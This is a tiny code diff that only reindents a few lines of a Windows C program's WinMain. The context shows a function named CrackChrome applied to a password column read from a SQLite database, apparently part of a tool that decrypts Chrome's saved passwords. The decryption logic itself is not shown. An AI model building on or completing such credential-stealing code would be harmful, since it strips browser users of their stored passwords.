@@ -58,8 +58,8 @@ char* CrackChrome(BYTE *pass)
 
 int APIENTRY WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
-	  if (crypt32() == TRUE)
-		{
+    if (crypt32() == TRUE)
+    {
         /* many code later ... */
         char *password = CrackChrome((BYTE *)sqlite3_column_text(stmt, 2));
     }
